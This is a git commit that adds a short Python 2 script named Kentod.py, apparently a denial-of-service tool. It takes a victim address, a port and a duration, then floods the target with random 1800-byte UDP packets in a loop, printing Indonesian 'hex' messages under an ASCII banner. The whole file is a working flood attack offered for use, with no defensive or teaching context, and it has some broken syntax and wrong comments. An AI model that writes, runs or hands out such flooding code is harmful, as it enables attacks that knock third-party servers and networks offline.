8c55924da35998f6cea04da3a734bcbdbeebdecd
XRyuuDdos <101028648+XRyuuDdos@users.noreply.github.com>
2022-03-06 11:20:11 +0700

    Add files via upload

---
+++ Kentod.py
@@ -0,0 +1,41 @@
+#2
+import time
+import socket
+import random
+import sys
+
+def usage():
+    print "
+██████╗░██╗░░░██╗██╗░░░██╗██╗░░░██╗
+██╔══██╗╚██╗░██╔╝██║░░░██║██║░░░██║
+██████╔╝░╚████╔╝░██║░░░██║██║░░░██║
+██╔══██╗░░╚██╔╝░░██║░░░██║██║░░░██║
+██║░░██║░░░██║░░░╚██████╔╝╚██████╔╝
+╚═╝░░╚═╝░░░╚═╝░░░░╚═════╝░░╚═════╝░"
+
+def flood(victim, vport, duration):
+    # okay so here I create the server, when i say "SOCK_DGRAM" it means it's a UDP type program
+    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    # 1024 representes one byte to the server
+    bytes = random._urandom(1800)
+    timeout =  time.time() + duration
+    sent = 3056
+
+    while 1:
+        if time.time() > timeout:
+            break
+        else:
+            pass
+        client.sendto(bytes, (victim, vport))
+        sent = sent + 1
+        print "Menyantet %s mengirim santet %s and port %s "%(sent, victim, vport)
+
+def main():
+    print len(sys.argv)
+    if len(sys.argv) != 4:
+        usage()
+    else:
+        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
+
+if __name__ == '__main__':
+    main()
